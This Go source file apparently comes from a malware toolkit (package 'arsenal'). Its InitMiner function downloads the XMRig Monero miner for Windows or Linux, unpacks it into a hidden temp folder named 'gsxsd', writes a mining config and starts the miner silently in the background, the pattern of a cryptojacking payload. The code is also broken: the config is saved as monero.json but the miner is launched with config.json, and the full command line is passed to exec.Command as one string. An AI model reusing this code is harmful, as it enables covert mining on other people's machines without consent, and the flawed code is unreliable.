package arsenal

import (
	"os"
	"os/exec"
	"fmt"
	"github.com/mholt/archiver/v3"
	utils "../utils"
	config "../config"
)

func intoTempDir(fname string) string {
	return os.TempDir() + "/" + fname
}

func InitMiner(platform string) {
	var fname string
	switch platform {
		case "windows":
			fname = intoTempDir("xmrig-5.11.0-gcc-win64.zip")
			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-gcc-win64.zip", fname)
			if err != nil {
				panic(err)
			}
		case "linux":
			fname = intoTempDir("xmrig-5.11.0-xenial-x64.tar.gz")
			err := utils.DownloadFile("https://github.com/xmrig/xmrig/releases/download/v5.11.0/xmrig-5.11.0-xenial-x64.tar.gz", fname)
			if err != nil {
				panic(err)
			}
		default:
			panic("Cannot determine OS version, aborting...")
	}
	fmt.Println("Extracting, please wait...")
	err := archiver.Unarchive(fname, intoTempDir("gsxsd"))
	if err != nil {
		panic(err)
	}
	extractdir := "xmrig-5.11.0"
	err = utils.WriteToFile(intoTempDir("gsxsd/monero.json"), config.MoneroConfig)
	if err != nil {
		panic(err)
	}
	cmd := exec.Command("./xmrig -c config.json -B")
	cmd.Dir = intoTempDir("gsxsd/" + extractdir)
	_, err = cmd.Output()
    if err != nil {
        panic(err)
    }
}